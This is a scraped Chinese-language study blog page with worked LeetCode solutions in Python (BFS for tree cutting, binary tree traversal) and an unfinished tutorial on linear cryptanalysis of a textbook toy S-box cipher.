      <meta itemprop="name" content="❄">
      <meta itemprop="description" content="ahhhhhhhhh~~~">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ❄">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/25/Lc_daily/LC-5.23-t.675-Cut-Off-Trees-for-Golf-Event/" class="post-title-link" itemprop="url">LC 5.23 t.675 Cut Off Trees for Golf Event</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-05-25 19:23:36" itemprop="dateCreated datePublished" datetime="2022-05-25T19:23:36+08:00">2022-05-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-05-23 17:22:24" itemprop="dateModified" datetime="2022-05-23T17:22:24+08:00">2022-05-23</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/LeetCode-daily/" itemprop="url" rel="index"><span itemprop="name">LeetCode_daily</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="5-23-675-为高尔夫比赛砍树"><a href="#5-23-675-为高尔夫比赛砍树" class="headerlink" title="5.23  675. 为高尔夫比赛砍树"></a>5.23  <a target="_blank" rel="noopener" href="https://leetcode.cn/problems/cut-off-trees-for-golf-event/">675. 为高尔夫比赛砍树</a></h4><p>难度：困难</p>
<p>你被请来给一个要举办高尔夫比赛的树林砍树。树林由一个 <code>m x n</code> 的矩阵表示， 在这个矩阵中：</p>
<ul>
<li><code>0</code> 表示障碍，无法触碰</li>
<li><code>1</code> 表示地面，可以行走</li>
<li><code>比 1 大的数</code> 表示有树的单元格，可以行走，数值表示树的高度</li>
</ul>
<p>每一步，你都可以向上、下、左、右四个方向之一移动一个单位，如果你站的地方有一棵树，那么你可以决定是否要砍倒它。</p>
<p>你需要按照树的高度从低向高砍掉所有的树，每砍过一颗树，该单元格的值变为 <code>1</code>（即变为地面）。</p>
<p>你将从 <code>(0, 0)</code> 点开始工作，返回你砍完所有树需要走的最小步数。 如果你无法砍完所有的树，返回 <code>-1</code> 。</p>
<p>可以保证的是，没有两棵树的高度是相同的，并且你至少需要砍倒一棵树。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2020/11/26/trees1.jpg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：forest = [[1,2,3],[0,0,4],[7,6,5]]</span><br><span class="line">输出：6</span><br><span class="line">解释：沿着上面的路径，你可以用 6 步，按从最矮到最高的顺序砍掉这些树。</span><br></pre></td></tr></table></figure>
<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2020/11/26/trees2.jpg" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：forest = [[1,2,3],[0,0,0],[7,6,5]]</span><br><span class="line">输出：-1</span><br><span class="line">解释：由于中间一行被障碍阻塞，无法访问最下面一行中的树。</span><br></pre></td></tr></table></figure>
<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：forest = [[2,3,4],[0,0,5],[8,7,6]]</span><br><span class="line">输出：6</span><br><span class="line">解释：可以按与示例 1 相同的路径来砍掉所有的树。</span><br><span class="line">(0,0) 位置的树，可以直接砍去，不用算步数。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>m == forest.length</code></li>
<li><code>n == forest[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 50</code></li>
<li><code>0 &lt;= forest[i][j] &lt;= 109</code></li>
</ul>
<h5 id="思路1：排序＋广搜"><a href="#思路1：排序＋广搜" class="headerlink" title="思路1：排序＋广搜"></a>思路1：排序＋广搜</h5><blockquote>
<p>类似 <a target="_blank" rel="noopener" href="https://leetcode.cn/problems/pacific-atlantic-water-flow/">417. 太平洋大西洋水流问题</a> 都是四个方向的广搜，但限制条件不同</p>
<p>先将需要砍掉的树按照树高度排序，需要记录坐标和高度 <code>(index_x,index_y,height)</code>，然后使用广度优先从四个方向搜索，搜索之前建立<code>visit[]</code>数组记录是否搜索过，可以先建立方向列表或直接遍历，原理是 <code>((x+1,y),(x-1,y),(x,y+1),(x,y-1))</code> 将满足限制条件的点再次入队。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">cutOffTree</span>(<span class="params">self, forest: <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"></span><br><span class="line">        <span class="comment">#广度优先搜素</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">bfs</span>(<span class="params">sx,sy,tx,ty</span>):</span><br><span class="line">            row = <span class="built_in">len</span>(forest)</span><br><span class="line">            col = <span class="built_in">len</span>(forest[<span class="number">0</span>])</span><br><span class="line">            queue = deque([(<span class="number">0</span>,sx,sy)])</span><br><span class="line">            visit = &#123;(sx,sy)&#125;</span><br><span class="line">            <span class="keyword">while</span> queue:</span><br><span class="line">                distance,x,y = queue.popleft()</span><br><span class="line">                <span class="keyword">if</span> x == tx <span class="keyword">and</span> y == ty:</span><br><span class="line">                    <span class="keyword">return</span> distance</span><br><span class="line">                <span class="keyword">for</span> nx,ny <span class="keyword">in</span> ((x+<span class="number">1</span>,y),(x-<span class="number">1</span>,y),(x,y+<span class="number">1</span>),(x,y-<span class="number">1</span>)):</span><br><span class="line">                    <span class="keyword">if</span> <span class="number">0</span>&lt;=nx&lt;row <span class="keyword">and</span> <span class="number">0</span>&lt;=ny&lt;col <span class="keyword">and</span> forest[nx][ny] <span class="keyword">and</span> (nx,ny) <span class="keyword">not</span> <span class="keyword">in</span> visit:</span><br><span class="line">                        visit.add((nx,ny))</span><br><span class="line">                        queue.append((distance+<span class="number">1</span>,nx,ny))</span><br><span class="line">                    <span class="comment">#print(&quot;queue:&quot;,queue)</span></span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#按照树的高度排序(indx_x,indx_y,height)</span></span><br><span class="line">        sort_trees = []</span><br><span class="line">        <span class="keyword">for</span> row,tree <span class="keyword">in</span> <span class="built_in">enumerate</span>(forest):</span><br><span class="line">            <span class="keyword">for</span> col,h <span class="keyword">in</span> <span class="built_in">enumerate</span>(tree):</span><br><span class="line">                <span class="keyword">if</span> h &gt; <span class="number">1</span>:</span><br><span class="line">                    sort_trees.append((row,col,h))</span><br><span class="line">        sort_trees = <span class="built_in">sorted</span>(sort_trees,key = <span class="keyword">lambda</span> x : x[<span class="number">2</span>])</span><br><span class="line">        <span class="built_in">print</span>(sort_trees)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        res = pre_x = pre_y = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> x,y,h <span class="keyword">in</span> sort_trees:</span><br><span class="line">            d = bfs(pre_x,pre_y,x,y)</span><br><span class="line">            <span class="keyword">if</span> d &lt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">            res += d</span><br><span class="line">            pre_x,pre_y = x,y</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>
<h5 id="矩阵类-BFS-的-demo"><a href="#矩阵类-BFS-的-demo" class="headerlink" title="矩阵类 BFS 的 demo"></a>矩阵类 BFS 的 demo</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">BFS</span>(<span class="params">sorce_val,target_val</span>):</span><br><span class="line">    row = <span class="built_in">len</span>(Matrix)</span><br><span class="line">    col = <span class="built_in">len</span>(Matrix[<span class="number">0</span>])</span><br><span class="line">    queue = deque([(need_val,indexs)])</span><br><span class="line">    visit = &#123;(pointer_index)&#125;</span><br><span class="line">    <span class="keyword">while</span> queue:</span><br><span class="line">        <span class="comment">#Limit the values stored in the queue based on conditions</span></span><br><span class="line">        need_val,indexs = queue.popleft()	</span><br><span class="line">        <span class="keyword">if</span> get_the_target_pointer:</span><br><span class="line">            <span class="comment">#conditions of return</span></span><br><span class="line">            <span class="keyword">return</span> need_val	</span><br><span class="line">        <span class="keyword">for</span> next_pointer <span class="keyword">in</span> all_directions:</span><br><span class="line">        <span class="comment">#eg: for nx,ny in ((x+1,y),(x-1,y),(x,y+1),(x,y-1)):</span></span><br><span class="line">        	<span class="comment">#search in all directions</span></span><br><span class="line">            <span class="keyword">if</span> fulfillment_of_conditions:</span><br><span class="line">            <span class="comment">#eg: if 0&lt;=nx&lt;row and 0&lt;=ny&lt;col and forest[nx][ny] and (nx,ny) not in visit:</span></span><br><span class="line">            	<span class="comment">#**Judgment Conditions**</span></span><br><span class="line">                visit.add((next_pointer))</span><br><span class="line">                queue.append((changed_need_val,indexs))</span><br><span class="line">    <span class="keyword">return</span> situation_of_ERR_or_boundary</span><br></pre></td></tr></table></figure>
<h5 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h5><p>还可以用 Dijkstra 和 A*启发式算法求解，待续…</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/25/Lc_daily/LC-5.24-t.965.-Univalued-Binary-Tree/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
      <meta itemprop="name" content="icSnow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="❄">
      <meta itemprop="description" content="ahhhhhhhhh~~~">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ❄">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/25/Lc_daily/LC-5.24-t.965.-Univalued-Binary-Tree/" class="post-title-link" itemprop="url">LC 5.24 t.965. Univalued Binary Tree</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-05-25 19:23:36" itemprop="dateCreated datePublished" datetime="2022-05-25T19:23:36+08:00">2022-05-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-05-24 11:04:14" itemprop="dateModified" datetime="2022-05-24T11:04:14+08:00">2022-05-24</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/LeetCode-daily/" itemprop="url" rel="index"><span itemprop="name">LeetCode_daily</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="965-单值二叉树"><a href="#965-单值二叉树" class="headerlink" title="965. 单值二叉树"></a><a target="_blank" rel="noopener" href="https://leetcode.cn/problems/univalued-binary-tree/">965. 单值二叉树</a></h4><p>难度：简单</p>
<p>如果二叉树每个节点都具有相同的值，那么该二叉树就是<em>单值</em>二叉树。</p>
<p>只有给定的树是单值二叉树时，才返回 <code>true</code>；否则返回 <code>false</code>。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/screen-shot-2018-12-25-at-50104-pm.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：[1,1,1,1,1,null,1]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>
<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/screen-shot-2018-12-25-at-50050-pm.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：[2,2,2,5,2]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li>给定树的节点数范围是 <code>[1, 100]</code>。</li>
<li>每个节点的值都是整数，范围为 <code>[0, 99]</code> 。</li>
</ol>
<h5 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h5><ol>
<li><p>深度优先，在判断到不等值时返回 False，一直相等，到遍历完返回 True</p>
</li>
<li><p>使用集合，无论采取哪种遍历方式，将所有值加入集合，并在最后判断集合的长度是否为 1 即可</p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, left=None, right=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.left = left</span></span><br><span class="line"><span class="comment">#         self.right = right</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">isUnivalTree</span>(<span class="params">self, root: TreeNode</span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        <span class="comment">#3 traverse</span></span><br><span class="line">        ttval = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">preorder</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            ttval.add(root.val)</span><br><span class="line">            preorder(root.left)</span><br><span class="line">            preorder(root.right)</span><br><span class="line"></span><br><span class="line">        preorder(root)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(ttval) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        #DFS</span></span><br><span class="line"><span class="string">        if not root:</span></span><br><span class="line"><span class="string">            return True</span></span><br><span class="line"><span class="string">        if root.left:</span></span><br><span class="line"><span class="string">            if root.val != root.left.val or not self.isUnivalTree(root.left):</span></span><br><span class="line"><span class="string">                return False</span></span><br><span class="line"><span class="string">        if root.right:</span></span><br><span class="line"><span class="string">            if root.val != root.right.val or not self.isUnivalTree(root.right):</span></span><br><span class="line"><span class="string">                return False</span></span><br><span class="line"><span class="string">        return True</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h5 id="前中后序遍历的-demo"><a href="#前中后序遍历的-demo" class="headerlink" title="前中后序遍历的 demo"></a>前中后序遍历的 demo</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>(<span class="params">root</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment">#preorder(root)</span></span><br><span class="line">    order(root.left)</span><br><span class="line">    <span class="comment">#inorder(root)</span></span><br><span class="line">    order(root.right)</span><br><span class="line">    <span class="comment">#postorder(root)</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/25/Cryptanalysis/%E7%BA%BF%E6%80%A7%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://ossimg.yzitc.com/2022/05/24/f573a763bec76.png">
      <meta itemprop="name" content="icSnow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="❄">
      <meta itemprop="description" content="ahhhhhhhhh~~~">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ❄">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/25/Cryptanalysis/%E7%BA%BF%E6%80%A7%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Linear Cryptanalysis</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-05-25 19:23:36" itemprop="dateCreated datePublished" datetime="2022-05-25T19:23:36+08:00">2022-05-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2022-05-26 16:42:02" itemprop="dateModified" datetime="2022-05-26T16:42:02+08:00">2022-05-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Cryptanalysis/" itemprop="url" rel="index"><span itemprop="name">Cryptanalysis</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="线性分析"><a href="#线性分析" class="headerlink" title="线性分析"></a>线性分析</h1><h2 id="principle"><a href="#principle" class="headerlink" title="principle"></a>principle</h2><p>线性分析通过寻找明密文与密钥间的线性相关性，构造可能产生线性偏差的掩码（搜索）来构造尽量大的线性逼近，从而逐比特的获取密钥信息。</p>
<p>$Example\ 1$</p>
<p>最简单的例子：$plaintext\ m,\ ciphertext\ c,\ key\ k = b\ bits$ ，密码系统 $c = m \oplus k$ ，显然该密码系统在不是一次一密的情况下是不安全的，但现在从另一个方面考虑：</p>
<p>如果逐比特考虑这该密码系统的 3 个变量，则对应比特也满足关系 $c_i = m_i \oplus k_i$ ，$_i$ 表示对应的比特位。那么对于已知明文攻击，就可以通过 $k_i = m_i \oplus c_i$ 来计算获得 $k_i$ 的每一个比特，并还原成 $k$ .这是一种通过明密文的线性关系来逐比特恢复密钥的一个最简单实例，但其并没有较强的说服力.</p>
<p>$Example\ 2$</p>
<p>考虑一个稍微复杂的加密系统，密文比特由部分明文比特和密钥比特确定：同样可以通过直接逐比特的写出明密文与密钥的关系来恢复密钥</p>
<script type="math/tex; mode=display">
\begin{aligned}
c_{3} &=m_{3} \oplus m_{1} \oplus m_{0} \oplus k_{3} \oplus k_{1} \oplus k_{0} \\
c_{2} &=m_{2} \oplus m_{0} \oplus k_{2} \oplus k_{0} \\
c_{1} &=m_{3} \oplus m_{2} \oplus k_{3} \oplus k_{2}, \text { and } \\
c_{0} &=m_{1} \oplus m_{0} \oplus k_{1} \oplus k_{0}\\
i.e.\\
k_{0} &=m_{0} \oplus c_{0} \oplus c_{3} \\
k_{1} &=m_{1} \oplus c_{0} \oplus c_{2} \oplus c_{3} \\
k_{2} &=m_{2} \oplus c_{1} \oplus c_{1} \oplus c_{2}, \text { and } \\
k_{3} &=m_{3} \oplus c_{0} \oplus c_{1} \oplus c_{2} \oplus c_{3}
\end{aligned}\\</script><h2 id="CIPHER-A："><a href="#CIPHER-A：" class="headerlink" title="CIPHER_A："></a>CIPHER_A：</h2><p>现在考虑密码系统 CIPHER_A：其中变量均为 4 bits，密钥 8 bits，记为 $k_0||k_1$ ，</p>
<p><img src="https://ossimg.yzitc.com/2022/05/23/20c5c34e70f97.png"></p>
<p>该密码系统满足如下关系：$u=m \oplus k_{0}, v=S[u] \text {, and } c=v \oplus k_{1} \text {. }$ 现在需要找到合适的密钥使得 $v=S[u]$ ，试图通过逐比特的恢复密钥，如何能够逐比特的考虑明密文及密钥？将其都做为列向量来考虑，并且用一个行向量来当作<strong>掩码</strong>，表示取或不取该比特：</p>
<script type="math/tex; mode=display">
(1,0,0,0) \times\left(\begin{array}{c}
m_{3} \\
m_{2} \\
m_{1} \\
m_{0}
\end{array}\right)=m_{3} \text {, and }(0,0,1,0) \times\left(\begin{array}{c}
m_{3} \\
m_{2} \\
m_{1} \\
m_{0}
\end{array}\right)=m_{1}</script><p>那么上述的 $Example\ 2$ 就可以表示为：（掩码随机取的，× 表示数量积）</p>
<script type="math/tex; mode=display">
(1,0,1,1) \times\left(\begin{array}{l}
m_{3} \\
m_{2} \\
m_{1} \\
m_{0}
\end{array}\right) \oplus(1,0,1,1) \times\left(\begin{array}{l}
k_{3} \\
k_{2} \\
k_{1} \\
k_{0} \\
\end{array}\right)=m_{3} \oplus m_{1} \oplus m_{0} \oplus k_{3} \oplus k_{1} \oplus k_{0}\\</script><script type="math/tex; mode=display">
i.e.\ \ \ c_{3}=m_{3} \oplus m_{1} \oplus m_{0} \oplus k_{3} \oplus k_{1} \oplus k_{0}\\</script><script type="math/tex; mode=display">
i.e.\ \ \ \alpha \cdot c=\beta \cdot m \oplus \beta \cdot k\ \ where\ \alpha=(1,0,0,0) \text { and } \beta=(1,0,1,1)</script><p>也即，可以通过掩码表示明密文相应位和密钥的线性关系（或进行一定的线性变化），掩码为 $\alpha\ and\ \beta$ . 但是仅仅线性的关系对上图的 CIPHER_A 是没有用的，因为存在非线性的 S-box，所以自然的考虑能否通过统计特性，使其逼近该密码系统中的非线性函数，即 S-box ？关系为 $\alpha \cdot x = \beta \cdot S[x]$（注意这里的结果是 0 或 1） 对于一个理想的非线性函数，无论使用任何掩码，该关系满足与否的概率为 $1/2$ ，那又很自然的想到，希望通过穷搜所有掩码来使关系满足的概率偏离 $1/2$ ，即存在<strong>偏差</strong> 。</p>
<p>以上密码使用掩码表示，并计算其已知偏差：</p>
<script type="math/tex; mode=display">
\begin{array}{l}
(\alpha \cdot m)=\left(\alpha \cdot k_{0}\right) \oplus(\alpha \cdot u) \text { with probability } 1\\
(\alpha \cdot u)=(\beta \cdot v) \quad \text { with probability } p\\
(\beta \cdot v)=\left(\beta \cdot k_{1}\right) \oplus(\beta \cdot c) \text { with probability } 1 .
\end{array}</script><p>只需要考虑中间的式子，进一步，将左边式子和右边式子相乘得到关于明密文及密钥的（化简过）（掩码位）关系式：</p>
<script type="math/tex; mode=display">
(\alpha \cdot m) \oplus(\beta \cdot c)=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right) \text { with probability } p \text {. }</script><p>也就是，在直到明密文对的情况下，找到  $\alpha \cdot x = \beta \cdot S[x]$ 关系式的相关信息，就能获得关于密钥的信息。</p>
<p>如果 $p \ne 1/2$ 即存在偏差，那么就有可能在一定的数据量内获得关于密钥的信息，假设 $p = 1/2 + \varepsilon$ ，则 $0&lt;|\boldsymbol{\varepsilon}| \leq \frac{1}{2}$ 为线性偏差，当然会期望偏差尽量大，因为偏差越大就需要越少的数据量。 </p>
<p>举例对上述非线性关系式  $\alpha \cdot x = \beta \cdot S[x]$ 的简单线性攻击（这里的 x 满足上述 CIPHER_A的 u 或 v)：</p>
<p><strong>建立区分器</strong></p>
<ol>
<li>穷举所有 $x$ ，并计算 $S[x]$ ;</li>
<li>对所有的 $x\ and\ S[x]$ 穷举所有掩码 $\alpha\ and\ \beta$ ；</li>
<li>算出 $\alpha \cdot x = \beta \cdot S[x]$ 的概率（或 $\alpha \cdot x \oplus 1= \beta \cdot S[x]$ 的概率）； </li>
</ol>
<p>例子：$p(\alpha \cdot x = \beta \cdot S[x]) = 2/16\ \ and\ \ p(\alpha \cdot x \oplus 1= \beta \cdot S[x]) = 14/16$ </p>
<p>$i.e.\ \ \ \  p((\alpha \cdot m) \oplus(\beta \cdot c) \oplus 1=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right))=14/16$ </p>
<script type="math/tex; mode=display">
\alpha=(1,0,0,1) \text { and } \beta=(0,0,1,0)</script><script type="math/tex; mode=display">
\begin{array}{|c|cccccccccccccccc|}
\hline \mathrm{x} & 0 & 1 & 2 & 3 & 4 & 5 & 6 & 7 & 8 & 9 & \mathrm{a} & \mathrm{b} & \mathrm{c} & \mathrm{d} & \mathrm{e} & \mathrm{f} \\
\hline \mathrm{S}[\mathrm{x}] & \mathrm{f} & \mathrm{e} & \mathrm{b} & \mathrm{c} & 6 & \mathrm{~d} & 7 & 8 & 0 & 3 & 9 & \mathrm{a} & 4 & 2 & 1 & 5 \\
\hline \hline \alpha \cdot x & 0 & 1 & 0 & 1 & 0 & 1 & 0 & 1 & 1 & 0 & 1 & 0 & 1 & 0 & 1 & 0 \\
\hline \beta \cdot S[x] & 1 & 1 & 1 & 0 & 1 & 0 & 1 & 0 & 0 & 1 & 0 & 1 & 0 & 1 & 0 & 0 \\
\hline
\end{array}</script><p>为了表述清楚：二元域内的运算和比较（module 2）</p>
<script type="math/tex; mode=display">
\alpha \cdot x = \beta \cdot S[x] \ \ \rightarrow\ \ (\alpha \cdot m) \oplus(\beta \cdot c)=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right)\ ::\ p = \frac{2}{16}</script><script type="math/tex; mode=display">
\alpha \cdot x \ne \beta \cdot S[x] \ \ \rightarrow\ \ (\alpha \cdot m) \oplus(\beta \cdot c) \oplus 1=\left(\alpha \cdot k_{0}\right) \oplus\left(\beta \cdot k_{1}\right)\ ::\ p = \frac{14}{16}</script><p><strong>恢复密钥</strong></p>
<ol>
<li><p>设置计数器 $T_0\ and\ T_1$ ，固定掩码 $\alpha\ and\ \beta$ ，使用多对明密文进行测试，计算 $(\alpha \cdot m) \oplus (\beta \cdot c)$ ：</p>
<p>为 1 ，$T_1$ 计数器＋1</p>
<p>为 0 ，$T_0$ 计数器 + 1</p>
<p>（注意这里使用的明密文对数量和偏差的大小有关）</p>
</li>
<li><p>可以先假设密钥值，观察两个计数器，可以获得 $(\alpha \cdot m) \oplus (\beta \cdot c)$ 的值（ 0 或 1）的分布，再根据相等与否的概率得出密钥信息 $(\alpha \cdot k_{0}) \oplus(\beta \cdot k_{1})=0\ or\ 1$ </p>
